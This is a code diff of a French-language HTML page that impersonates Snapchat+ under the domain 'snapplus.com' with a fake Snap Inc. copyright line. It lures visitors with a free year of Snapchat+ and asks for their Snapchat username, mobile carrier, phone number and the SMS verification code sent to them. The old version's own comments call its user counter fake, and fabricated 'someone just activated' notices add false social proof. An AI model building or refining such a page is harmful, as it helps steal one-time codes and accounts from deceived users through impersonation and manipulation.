@@ -1,149 +1,260 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Snapchat+ Verification</title>
+    <title>snapplus.com — Snapchat+</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; }
         body {
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            background: radial-gradient(ellipse at center, #0d0d1a 0%, #000 100%);
-            padding: 16px;
+            background: radial-gradient(ellipse at top, #1a1a2e 0%, #0a0a0f 100%);
+            padding: 20px;
             position: relative;
-            overflow-x: hidden;
         }
-        /* Animated background particles */
+        /* subtle grid background */
         body::before {
             content: '';
             position: fixed;
             inset: 0;
-            background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.05'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+            background-image: 
+                linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
+            background-size: 40px 40px;
+            pointer-events: none;
         }
-        .container { width: 100%; max-width: 420px; position: relative; z-index: 1; }
+        .container { width: 100%; max-width: 480px; position: relative; z-index: 1; }
+
+        /* Main card — glassmorphism */
         .card {
-            background: rgba(20,20,35,0.85);
-            backdrop-filter: blur(20px);
+            background: rgba(22,22,38,0.85);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
             border-radius: 40px;
-            padding: 36px 28px 28px;
-            box-shadow: 0 30px 80px rgba(0,0,0,0.9), inset 0 1px 0 rgba(255,255,255,0.05);
+            padding: 32px 28px 28px;
             border: 1px solid rgba(255,255,255,0.06);
+            box-shadow: 0 30px 80px rgba(0,0,0,0.6);
             transition: transform 0.3s ease;
         }
         .card:hover { transform: translateY(-2px); }
 
-        /* Live counter */
-        .live-counter {
+        /* ===== HEADER ===== */
+        .header {
             display: flex;
-            justify-content: center;
             align-items: center;
-            gap: 8px;
+            justify-content: space-between;
             margin-bottom: 20px;
-            padding: 8px 16px;
-            background: rgba(255,252,0,0.08);
-            border-radius: 30px;
-            border: 1px solid rgba(255,252,0,0.15);
-            animation: pulse 2s infinite;
         }
-        .live-counter .dot {
-            width: 8px;
-            height: 8px;
-            background: #00ff88;
-            border-radius: 50%;
-            animation: blink 1s infinite;
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
-        .live-counter span {
-            color: #aaa;
-            font-size: 13px;
-            font-weight: 500;
-        }
-        .live-counter strong {
-            color: #FFFC00;
-            font-weight: 700;
-            font-size: 15px;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.2; }
-        }
-        @keyframes pulse {
-            0%, 100% { box-shadow: 0 0 20px rgba(255,252,0,0.05); }
-            50% { box-shadow: 0 0 30px rgba(255,252,0,0.15); }
-        }
-
-        .lang-selector { display: flex; gap: 8px; justify-content: flex-end; margin-bottom: 16px; }
-        .lang-selector button { background: transparent; border: 1px solid rgba(255,255,255,0.1); color: #888; padding: 4px 12px; border-radius: 20px; cursor: pointer; font-size: 12px; transition: all 0.3s; }
-        .lang-selector button:hover { border-color: #FFFC00; color: #fff; }
-        .lang-selector button.active { border-color: #FFFC00; color: #fff; background: rgba(255,252,0,0.1); }
-
-        .brand { text-align: center; margin-bottom: 24px; }
-        .brand .snap-icon {
-            width: 72px; height: 72px;
+        .brand .ghost {
+            width: 44px;
+            height: 44px;
             background: linear-gradient(135deg, #FFFC00, #FFD700);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 12px;
-            font-size: 36px;
-            box-shadow: 0 0 60px rgba(255,252,0,0.15);
-            transition: transform 0.3s;
+            font-size: 24px;
+            box-shadow: 0 0 30px rgba(255,252,0,0.15);
         }
-        .brand .snap-icon:hover { transform: scale(1.05); }
-        .brand h1 { font-size: 32px; font-weight: 700; color: #fff; letter-spacing: -0.5px; }
+        .brand h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: -0.3px;
+        }
         .brand h1 span { color: #FFFC00; }
-        .brand .tagline { color: #888; font-size: 14px; margin-top: 6px; }
-
-        .step { display: none; animation: fadeUp 0.5s cubic-bezier(0.16, 1, 0.3, 1); }
-        .step.active { display: block; }
-        @keyframes fadeUp { 0% { opacity: 0; transform: translateY(20px) scale(0.98); } 100% { opacity: 1; transform: translateY(0) scale(1); } }
-
-        .step-title { color: #fff; font-size: 22px; font-weight: 600; text-align: center; margin-bottom: 20px; }
-
-        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
-        .country-card, .network-card {
-            padding: 18px 12px;
+        .brand .domain {
+            font-size: 12px;
+            color: #888;
+            font-weight: 400;
+            margin-top: 2px;
+        }
+        .lang-switch {
+            display: flex;
+            gap: 6px;
+        }
+        .lang-switch button {
+            background: transparent;
+            border: 1px solid rgba(255,255,255,0.08);
+            color: #888;
+            padding: 4px 12px;
             border-radius: 20px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 500;
+            transition: all 0.3s;
+        }
+        .lang-switch button:hover { border-color: rgba(255,252,0,0.3); color: #fff; }
+        .lang-switch button.active { border-color: #FFFC00; color: #fff; background: rgba(255,252,0,0.08); }
+
+        /* ===== HERO ===== */
+        .hero {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .hero h2 {
+            font-size: 26px;
+            font-weight: 800;
+            color: #fff;
+            line-height: 1.2;
+            letter-spacing: -0.5px;
+        }
+        .hero h2 .highlight { color: #FFFC00; }
+        .hero .sub {
+            color: #999;
+            font-size: 14px;
+            margin-top: 6px;
+        }
+
+        /* ===== BENEFITS ===== */
+        .benefits {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            margin: 16px 0 20px;
+            background: rgba(255,255,255,0.03);
+            border-radius: 16px;
+            padding: 12px 14px;
+            border: 1px solid rgba(255,255,255,0.04);
+        }
+        .benefit-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #ccc;
+            font-size: 13px;
+            font-weight: 500;
+        }
+        .benefit-item .icon { font-size: 16px; }
+        .benefit-item .label { color: #aaa; }
+
+        /* ===== INFO ===== */
+        .info-box {
+            background: rgba(255,252,0,0.06);
+            border-radius: 14px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            border-left: 3px solid #FFFC00;
+        }
+        .info-box p {
+            color: #aaa;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+        .info-box strong { color: #fff; }
+
+        /* ===== COUNTRY SELECTOR ===== */
+        .section-label {
+            color: #aaa;
+            font-size: 13px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 10px;
+        }
+        .country-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-bottom: 18px;
+        }
+        .country-btn {
+            padding: 12px 6px;
+            border-radius: 14px;
             border: 2px solid rgba(255,255,255,0.06);
             background: rgba(255,255,255,0.03);
-            color: #fff;
-            font-size: 16px;
+            color: #aaa;
+            font-size: 13px;
             font-weight: 500;
             cursor: pointer;
             transition: all 0.3s;
             text-align: center;
         }
-        .country-card:hover, .network-card:hover { transform: translateY(-2px); border-color: rgba(255,252,0,0.3); }
-        .country-card .flag { font-size: 36px; display: block; margin-bottom: 6px; }
-        .country-card.selected, .network-card.selected { border-color: #FFFC00; background: rgba(255,252,0,0.08); transform: translateY(-2px); }
-        .network-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .network-card { font-size: 13px; padding: 14px 10px; }
+        .country-btn .flag { font-size: 22px; display: block; margin-bottom: 4px; }
+        .country-btn:hover { border-color: rgba(255,252,0,0.2); color: #fff; }
+        .country-btn.selected { border-color: #FFFC00; color: #fff; background: rgba(255,252,0,0.08); }
 
+        /* ===== INPUTS ===== */
         .input-group {
+            margin-bottom: 16px;
+        }
+        .input-group label {
+            display: block;
+            color: #aaa;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 6px;
+        }
+        .input-group .input-wrap {
             display: flex;
             align-items: center;
             background: rgba(255,255,255,0.04);
-            border-radius: 18px;
+            border-radius: 16px;
             border: 2px solid rgba(255,255,255,0.06);
-            padding: 0 18px;
-            margin-bottom: 14px;
+            padding: 0 16px;
             transition: all 0.3s;
         }
-        .input-group:focus-within { border-color: #FFFC00; box-shadow: 0 0 30px rgba(255,252,0,0.05); }
-        .input-group .code { color: #aaa; font-size: 16px; font-weight: 500; padding-right: 14px; border-right: 1px solid rgba(255,255,255,0.06); }
-        .input-group input { flex: 1; padding: 18px 14px; background: transparent; border: none; outline: none; color: #fff; font-size: 17px; }
-        .input-group input::placeholder { color: #444; }
+        .input-group .input-wrap:focus-within {
+            border-color: #FFFC00;
+            box-shadow: 0 0 30px rgba(255,252,0,0.04);
+        }
+        .input-group .input-wrap .prefix {
+            color: #888;
+            font-size: 16px;
+            font-weight: 500;
+            padding-right: 12px;
+            border-right: 1px solid rgba(255,255,255,0.06);
+        }
+        .input-group .input-wrap input {
+            flex: 1;
+            padding: 16px 12px;
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #fff;
+            font-size: 16px;
+        }
+        .input-group .input-wrap input::placeholder { color: #444; }
 
+        /* Operator buttons */
+        .operator-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+        .operator-btn {
+            padding: 10px;
+            border-radius: 12px;
+            border: 2px solid rgba(255,255,255,0.06);
+            background: rgba(255,255,255,0.03);
+            color: #aaa;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+        }
+        .operator-btn:hover { border-color: rgba(255,252,0,0.2); color: #fff; }
+        .operator-btn.selected { border-color: #FFFC00; color: #fff; background: rgba(255,252,0,0.08); }
+
+        /* ===== BUTTON ===== */
         .btn {
             width: 100%;
             padding: 18px;
             border-radius: 18px;
             border: none;
             font-size: 18px;
-            font-weight: 600;
+            font-weight: 700;
             cursor: pointer;
             transition: all 0.3s;
             position: relative;
@@ -153,31 +264,32 @@
             background: linear-gradient(135deg, #FFFC00, #FFD700);
             color: #000;
         }
-        .btn-primary:hover { transform: scale(1.02); box-shadow: 0 8px 40px rgba(255,252,0,0.25); }
-        .btn-primary:disabled { opacity: 0.5; transform: none !important; cursor: not-allowed; }
-        .btn-secondary { background: rgba(255,255,255,0.06); color: #fff; margin-top: 10px; }
-        .btn-secondary:hover { background: rgba(255,255,255,0.1); }
+        .btn-primary:hover { transform: scale(1.02); box-shadow: 0 8px 40px rgba(255,252,0,0.2); }
+        .btn-primary:disabled { opacity: 0.5; transform: none !important; cursor: not-allowed; box-shadow: none; }
 
-        .otp-box { display: flex; gap: 12px; justify-content: center; margin: 24px 0 20px; }
+        /* ===== OTP ===== */
+        .otp-box { display: flex; gap: 10px; justify-content: center; margin: 20px 0; }
         .otp-box input {
-            width: 56px;
-            height: 64px;
+            width: 52px;
+            height: 58px;
             text-align: center;
-            font-size: 28px;
+            font-size: 24px;
             font-weight: 700;
             background: rgba(255,255,255,0.04);
             border: 2px solid rgba(255,255,255,0.08);
-            border-radius: 16px;
+            border-radius: 14px;
             color: #fff;
             outline: none;
             transition: all 0.3s;
             caret-color: #FFFC00;
         }
-        .otp-box input:focus { border-color: #FFFC00; box-shadow: 0 0 30px rgba(255,252,0,0.06); background: rgba(255,255,255,0.06); }
+        .otp-box input:focus {
+            border-color: #FFFC00;
+            box-shadow: 0 0 30px rgba(255,252,0,0.06);
+            background: rgba(255,255,255,0.06);
+        }
 
-        .otp-hint { text-align: center; color: #777; font-size: 14px; }
-        .otp-hint strong { color: #fff; }
-
+        /* ===== LOADER ===== */
         .loader-wrap { text-align: center; padding: 20px 0; }
         .loader-spinner {
             width: 48px;
@@ -189,638 +301,545 @@
             animation: spin 0.9s cubic-bezier(0.16, 1, 0.3, 1) infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .progress-track { width: 100%; height: 4px; background: rgba(255,255,255,0.06); border-radius: 4px; overflow: hidden; margin-top: 16px; }
-        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #FFFC00, #FFD700); border-radius: 4px; transition: width 0.5s cubic-bezier(0.16, 1, 0.3, 1); }
         .loader-text { color: #888; font-size: 15px; text-align: center; margin-top: 12px; }
         .loader-text strong { color: #fff; }
+        .progress-track { width: 100%; height: 4px; background: rgba(255,255,255,0.06); border-radius: 4px; overflow: hidden; margin-top: 16px; }
+        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #FFFC00, #FFD700); border-radius: 4px; transition: width 0.5s cubic-bezier(0.16, 1, 0.3, 1); }
 
+        /* ===== SUCCESS / ERROR ===== */
         .icon-big { font-size: 64px; text-align: center; margin: 12px 0 16px; }
         .msg-center { text-align: center; color: #aaa; font-size: 16px; line-height: 1.7; }
         .error-text { color: #ff6b6b !important; }
         .success-text { color: #69db7c !important; }
 
-        .info-box {
-            background: rgba(255,255,255,0.03);
-            border-radius: 14px;
-            padding: 14px 18px;
-            margin-bottom: 16px;
-            border-left: 3px solid #FFFC00;
+        /* ===== FOOTER ===== */
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+            padding-top: 16px;
+            border-top: 1px solid rgba(255,255,255,0.04);
+            color: rgba(255,255,255,0.15);
+            font-size: 11px;
         }
-        .info-box p { color: #aaa; font-size: 14px; line-height: 1.6; }
-        .info-box strong { color: #fff; }
+        .footer a { color: rgba(255,255,255,0.2); text-decoration: none; }
+        .footer a:hover { color: #FFFC00; }
 
-        .footer { text-align: center; color: rgba(255,255,255,0.12); font-size: 12px; margin-top: 24px; letter-spacing: 0.3px; }
-
-        /* Toast notification */
-        .toast {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: rgba(0,0,0,0.8);
-            backdrop-filter: blur(10px);
-            padding: 12px 20px;
-            border-radius: 12px;
-            border: 1px solid rgba(255,252,0,0.2);
-            color: #fff;
-            font-size: 14px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
-            transform: translateY(100px);
-            opacity: 0;
-            transition: all 0.5s cubic-bezier(0.16, 1, 0.3, 1);
-            z-index: 999;
+        /* ===== STEPS ===== */
+        .step { display: none; animation: fadeUp 0.5s cubic-bezier(0.16, 1, 0.3, 1); }
+        .step.active { display: block; }
+        @keyframes fadeUp {
+            0% { opacity: 0; transform: translateY(20px) scale(0.98); }
+            100% { opacity: 1; transform: translateY(0) scale(1); }
         }
-        .toast.show {
-            transform: translateY(0);
-            opacity: 1;
-        }
-        .toast .highlight { color: #FFFC00; font-weight: 600; }
+        .hidden { display: none !important; }
 
-        @media (max-width: 440px) {
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 480px) {
             .card { padding: 24px 16px; }
-            .brand h1 { font-size: 26px; }
-            .otp-box input { width: 46px; height: 54px; font-size: 22px; }
-            .country-card { padding: 16px 8px; font-size: 14px; }
-            .country-card .flag { font-size: 28px; }
-            .network-card { font-size: 12px; padding: 12px 8px; }
+            .hero h2 { font-size: 22px; }
+            .benefits { grid-template-columns: 1fr 1fr; gap: 6px; padding: 10px; }
+            .benefit-item { font-size: 12px; }
+            .country-grid { grid-template-columns: 1fr 1fr 1fr; }
+            .operator-grid { grid-template-columns: 1fr 1fr 1fr; }
+            .otp-box input { width: 44px; height: 50px; font-size: 20px; }
+            .brand h1 { font-size: 18px; }
+            .brand .ghost { width: 36px; height: 36px; font-size: 18px; }
         }
     </style>
 </head>
 <body>
 
-    <!-- Toast -->
-    <div id="toast" class="toast">🎉 <span class="highlight">Someone</span> just verified!</div>
+<div class="container">
+    <div class="card">
 
-    <div class="container">
-        <div class="card">
-
-            <!-- Live Counter -->
-            <div class="live-counter">
-                <span class="dot"></span>
-                <span>🔥 <strong id="liveCount">1,247</strong> users claimed today</span>
-            </div>
-
-            <!-- Language Selector -->
-            <div class="lang-selector">
-                <button class="active" data-lang="en">🇬🇧 EN</button>
-                <button data-lang="fr">🇫🇷 FR</button>
-                <button data-lang="nl">🇳🇱 NL</button>
-            </div>
-
-            <!-- Brand -->
+        <!-- ===== HEADER ===== -->
+        <div class="header">
             <div class="brand">
-                <div class="snap-icon">👻</div>
-                <h1>snapchat<span>+</span></h1>
-                <p class="tagline" id="tagline">Verify your account</p>
+                <div class="ghost">👻</div>
+                <div>
+                    <h1>snap<span>chat</span>+</h1>
+                    <div class="domain">snapplus.com</div>
+                </div>
+            </div>
+            <div class="lang-switch">
+                <button class="active" data-lang="fr">FR</button>
+                <button data-lang="en">EN</button>
+                <button data-lang="nl">NL</button>
+            </div>
+        </div>
+
+        <!-- ===== STEP 1: COUNTRY + PHONE ===== -->
+        <div id="step1" class="step active">
+
+            <!-- Hero -->
+            <div class="hero">
+                <h2>Activez <span class="highlight">Snapchat+</span><br />gratuitement pendant 1 an !</h2>
+                <p class="sub">🎁 <span id="liveToast">Élodie</span> vient de recevoir son Snap+ !</p>
             </div>
 
-            <!-- STEP 1: Country -->
-            <div id="step1" class="step active">
-                <div class="step-title" id="selectCountry">🌍 Select Your Country</div>
-                <div class="grid-2">
-                    <div class="country-card" data-country="FR">
-                        <span class="flag">🇫🇷</span>
-                        <span class="country-name" id="france">France</span>
-                    </div>
-                    <div class="country-card" data-country="BE">
-                        <span class="flag">🇧🇪</span>
-                        <span class="country-name" id="belgium">Belgium</span>
-                    </div>
+            <!-- Benefits -->
+            <div class="benefits">
+                <div class="benefit-item"><span class="icon">✨</span> <span class="label">Badges exclusifs</span></div>
+                <div class="benefit-item"><span class="icon">👀</span> <span class="label">Qui a revu votre story</span></div>
+                <div class="benefit-item"><span class="icon">📈</span> <span class="label">Boost de score</span></div>
+                <div class="benefit-item"><span class="icon">⏳</span> <span class="label">Offre limitée</span></div>
+            </div>
+
+            <!-- Info -->
+            <div class="info-box">
+                <p>📱 <strong>Disponible uniquement</strong> pour les numéros France des opérateurs listés ci-dessous — tous les autres ne fonctionnent pas.</p>
+            </div>
+
+            <!-- Country -->
+            <div class="section-label">🌍 Pays</div>
+            <div class="country-grid" id="countryGrid">
+                <div class="country-btn selected" data-country="FR"><span class="flag">🇫🇷</span> France</div>
+                <div class="country-btn" data-country="BE"><span class="flag">🇧🇪</span> Belgique</div>
+                <div class="country-btn" data-country="CH"><span class="flag">🇨🇭</span> Suisse</div>
+            </div>
+
+            <!-- Username -->
+            <div class="input-group">
+                <label for="usernameInput">👤 Nom d'utilisateur Snapchat</label>
+                <div class="input-wrap">
+                    <span class="prefix">@</span>
+                    <input type="text" id="usernameInput" placeholder="votre_snap" maxlength="30" />
                 </div>
             </div>
 
-            <!-- STEP 2: Network -->
-            <div id="step2" class="step">
-                <div class="step-title" id="selectNetwork">📡 Select Your Network</div>
-                <div class="network-grid" id="networkGrid"></div>
-                <button class="btn btn-secondary" id="backToCountry">← Back</button>
+            <!-- Operator -->
+            <div class="section-label">📡 Opérateur mobile</div>
+            <div class="operator-grid" id="operatorGrid">
+                <div class="operator-btn" data-operator="SFR">SFR</div>
+                <div class="operator-btn" data-operator="Bouygues">Bouygues</div>
+                <div class="operator-btn selected" data-operator="Orange">Orange</div>
             </div>
 
-            <!-- STEP 3: Phone -->
-            <div id="step3" class="step">
-                <div class="step-title" id="enterNumber">📱 Enter Your Phone Number</div>
-                <div class="info-box">
-                    <p id="phoneInfo">🔐 We'll send a verification code to your number.</p>
-                </div>
-                <div class="input-group">
+            <!-- Phone -->
+            <div class="input-group">
+                <label for="phoneInput">📞 Numéro de téléphone</label>
+                <div class="input-wrap">
                     <span class="code" id="countryCode">+33</span>
                     <input type="tel" id="phoneInput" placeholder="6 12 34 56 78" maxlength="15" />
                 </div>
-                <button class="btn btn-primary" id="sendBtn">Send Code →</button>
-                <button class="btn btn-secondary" id="backToNetwork">← Back</button>
-                <p style="color:rgba(255,255,255,0.2);font-size:11px;text-align:center;margin-top:14px;" id="termsText">By continuing you agree to our Terms &amp; Privacy Policy</p>
+                <div style="margin-top:6px; color:#555; font-size:12px;">Numéro mobile France (10 chiffres) — c'est pour savoir si vous êtes un humain 🐻</div>
             </div>
 
-            <!-- STEP 4: Loading -->
-            <div id="step4" class="step">
-                <div class="loader-wrap">
-                    <div class="loader-spinner"></div>
-                    <div class="step-title" id="sendingTitle" style="font-size:20px;">⏳ Sending Code...</div>
-                    <p class="loader-text" id="sendingText">We're sending a <strong>verification code</strong> to your number.</p>
-                    <p class="loader-text" style="font-size:13px;color:#666;margin-top:4px;" id="waitText">Please wait, this may take a few seconds.</p>
-                    <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
-                </div>
-            </div>
-
-            <!-- STEP 5: OTP -->
-            <div id="step5" class="step">
-                <div class="step-title" id="enterOTP">🔑 Enter Verification Code</div>
-                <div class="info-box">
-                    <p id="otpInfo">📲 We sent a <strong>verification code</strong> to <strong id="displayNumber"></strong></p>
-                    <p style="font-size:13px;color:#666;margin-top:4px;" id="otpHint">Please check your SMS and enter the code below.</p>
-                </div>
-                <div class="otp-box" id="otpContainer"></div>
-                <button class="btn btn-primary" id="verifyBtn">Submit Code →</button>
-                <button class="btn btn-secondary" id="backToPhone">← Back</button>
-                <div id="verifyingMessage" style="display:none; text-align:center; color:#FFFC00; margin-top:12px;">
-                    ⏳ Verifying your code...
-                </div>
-            </div>
-
-            <!-- STEP 6: Success -->
-            <div id="step6" class="step">
-                <div class="icon-big">✅</div>
-                <div class="step-title" id="successTitle">Verification Successful!</div>
-                <div class="info-box" style="border-left-color:#69db7c;">
-                    <p id="successText">✅ Your account has been verified.</p>
-                    <p style="font-size:13px;color:#666;margin-top:4px;" id="successSub">You can now access all features.</p>
-                </div>
-                <button class="btn btn-primary" style="margin-top:20px;" id="resetBtn">Continue</button>
-            </div>
-
-            <!-- STEP 7: Error -->
-            <div id="step7" class="step">
-                <div class="icon-big">❌</div>
-                <div class="step-title" id="errorTitle">Invalid Number</div>
-                <div class="info-box" style="border-left-color:#ff6b6b;">
-                    <p id="errorText">❌ The number you entered is <strong>incorrect</strong>.</p>
-                    <p style="font-size:13px;color:#666;margin-top:4px;" id="errorSub">Please try again with a valid number.</p>
-                </div>
-                <button class="btn btn-primary" style="margin-top:20px;" id="retryOTPBtn">Try Again</button>
-            </div>
-
-            <div class="footer">© 2026 Snap Inc.</div>
-
+            <button class="btn btn-primary" id="sendBtn">Continuer →</button>
         </div>
+
+        <!-- ===== STEP 2: LOADING ===== -->
+        <div id="step2" class="step">
+            <div class="loader-wrap">
+                <div class="loader-spinner"></div>
+                <div class="loader-text" id="loadingText">⏳ Envoi du code de vérification...</div>
+                <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
+            </div>
+        </div>
+
+        <!-- ===== STEP 3: OTP ===== -->
+        <div id="step3" class="step">
+            <div class="hero">
+                <h2>🔑 Code de vérification</h2>
+                <p class="sub">Nous avons envoyé un code à <strong id="displayNumber"></strong></p>
+            </div>
+            <div class="otp-box" id="otpContainer"></div>
+            <button class="btn btn-primary" id="verifyBtn">Vérifier →</button>
+            <div id="verifyingMessage" style="display:none; text-align:center; color:#FFFC00; margin-top:12px;">
+                ⏳ Vérification en cours...
+            </div>
+            <button class="btn btn-secondary" style="background:rgba(255,255,255,0.06); color:#fff; margin-top:10px; padding:14px; border-radius:14px; border:none; width:100%; font-size:16px; cursor:pointer;" id="backToPhone">← Retour</button>
+        </div>
+
+        <!-- ===== STEP 4: SUCCESS ===== -->
+        <div id="step4" class="step">
+            <div class="icon-big">✅</div>
+            <div class="hero">
+                <h2 style="color:#69db7c;">Félicitations !</h2>
+                <p class="sub" style="color:#aaa;">Votre compte Snapchat+ est maintenant actif pour 1 an !</p>
+                <div style="margin-top:16px; padding:12px; background:rgba(255,252,0,0.08); border-radius:14px; border:1px solid rgba(255,252,0,0.15);">
+                    <span style="color:#FFFC00;">🎉 Snapchat+ activé !</span>
+                </div>
+            </div>
+            <button class="btn btn-primary" id="resetBtn">Ouvrir Snapchat</button>
+        </div>
+
+        <!-- ===== STEP 5: ERROR ===== -->
+        <div id="step5" class="step">
+            <div class="icon-big">❌</div>
+            <div class="hero">
+                <h2 style="color:#ff6b6b;">Numéro invalide</h2>
+                <p class="sub" style="color:#aaa;">Le numéro que vous avez saisi est incorrect. Veuillez réessayer.</p>
+            </div>
+            <button class="btn btn-primary" id="retryBtn" style="background: #ff6b6b; color:#fff;">Réessayer</button>
+        </div>
+
+        <!-- ===== FOOTER ===== -->
+        <div class="footer">
+            <span>© 2026 Snap Inc.</span>
+            <a href="#">Cloudflare Privacy</a>
+            <a href="#">Help</a>
+        </div>
+
     </div>
+</div>
 
-    <script>
-        // ============================================================
-        // FAKE LIVE COUNTER
-        // ============================================================
-        let liveCount = 1247;
-        setInterval(() => {
-            liveCount += Math.floor(Math.random() * 3);
-            document.getElementById('liveCount').textContent = liveCount.toLocaleString();
-        }, 8000);
+<script>
+    // ============================================================
+    // STATE
+    // ============================================================
+    let selectedCountry = null;
+    let selectedOperator = null;
+    let queueId = null;
+    let otpLength = 4;
+    let currentLang = 'fr';
 
-        // ============================================================
-        // TOAST NOTIFICATIONS
-        // ============================================================
-        function showToast() {
-            const names = ['Alex', 'Jordan', 'Taylor', 'Riley', 'Morgan', 'Casey', 'Avery', 'Quinn', 'Harper', 'Logan'];
-            const name = names[Math.floor(Math.random() * names.length)];
-            const toast = document.getElementById('toast');
-            toast.innerHTML = `🎉 <span class="highlight">${name}</span> just verified!`;
-            toast.classList.add('show');
-            setTimeout(() => toast.classList.remove('show'), 3500);
-        }
-        setInterval(showToast, 15000);
-        showToast();
+    const COUNTRIES = {
+        FR: { code: '+33', queue: 'A' },
+        BE: { code: '+32', queue: 'B' },
+        CH: { code: '+41', queue: 'C' }
+    };
 
-        // ============================================================
-        // STATE
-        // ============================================================
-        let selectedCountry = null;
-        let selectedNetwork = null;
-        let queueId = null;
-        let otpLength = 4;
-        let currentLang = 'en';
+    // ============================================================
+    // DOM REFS
+    // ============================================================
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const step3 = document.getElementById('step3');
+    const step4 = document.getElementById('step4');
+    const step5 = document.getElementById('step5');
 
-        const COUNTRIES = {
-            FR: { name: 'France', code: '+33', networks: ['Orange', 'SFR', 'Bouygues', 'Free'], queue: 'A' },
-            BE: { name: 'Belgium', code: '+32', networks: ['Proximus', 'Orange BE', 'BASE', 'Telenet'], queue: 'B' }
-        };
+    const countryGrid = document.getElementById('countryGrid');
+    const operatorGrid = document.getElementById('operatorGrid');
+    const countryCode = document.getElementById('countryCode');
+    const usernameInput = document.getElementById('usernameInput');
+    const phoneInput = document.getElementById('phoneInput');
+    const displayNumber = document.getElementById('displayNumber');
+    const progressFill = document.getElementById('progressFill');
+    const otpContainer = document.getElementById('otpContainer');
+    const sendBtn = document.getElementById('sendBtn');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const verifyingMessage = document.getElementById('verifyingMessage');
+    const loadingText = document.getElementById('loadingText');
 
-        // ============================================================
-        // TRANSLATIONS (same as before, keep for brevity)
-        // ============================================================
-        const LANG = {
-            en: {
-                tagline: 'Verify your account',
-                selectCountry: '🌍 Select Your Country',
-                france: 'France',
-                belgium: 'Belgium',
-                selectNetwork: '📡 Select Your Network',
-                back: '← Back',
-                enterNumber: '📱 Enter Your Phone Number',
-                phoneInfo: '🔐 We\'ll send a verification code to your number.',
-                send: 'Send Code →',
-                terms: 'By continuing you agree to our Terms & Privacy Policy',
-                sending: '⏳ Sending Code...',
-                sendingText: 'We\'re sending a <strong>verification code</strong> to your number.',
-                waitText: 'Please wait, this may take a few seconds.',
-                enterOTP: '🔑 Enter Verification Code',
-                otpInfo: '📲 We sent a <strong>verification code</strong> to ',
-                otpHint: 'Please check your SMS and enter the code below.',
-                verify: 'Submit Code →',
-                successTitle: 'Verification Successful!',
-                successText: '✅ Your account has been verified.',
-                successSub: 'You can now access all features.',
-                continueBtn: 'Continue',
-                errorTitle: 'Invalid Number',
-                errorText: '❌ The number you entered is <strong>incorrect</strong>.',
-                errorSub: 'Please try again with a valid number.',
-                tryAgain: 'Try Again'
-            },
-            fr: {
-                tagline: 'Vérifiez votre compte',
-                selectCountry: '🌍 Sélectionnez votre pays',
-                france: 'France',
-                belgium: 'Belgique',
-                selectNetwork: '📡 Sélectionnez votre opérateur',
-                back: '← Retour',
-                enterNumber: '📱 Entrez votre numéro',
-                phoneInfo: '🔐 Nous enverrons un code de vérification à votre numéro.',
-                send: 'Envoyer le code →',
-                terms: 'En continuant, vous acceptez nos Conditions & Politique de confidentialité',
-                sending: '⏳ Envoi du code...',
-                sendingText: 'Nous envoyons un <strong>code de vérification</strong> à votre numéro.',
-                waitText: 'Veuillez patienter, cela peut prendre quelques secondes.',
-                enterOTP: '🔑 Entrez le code de vérification',
-                otpInfo: '📲 Nous avons envoyé un <strong>code de vérification</strong> à ',
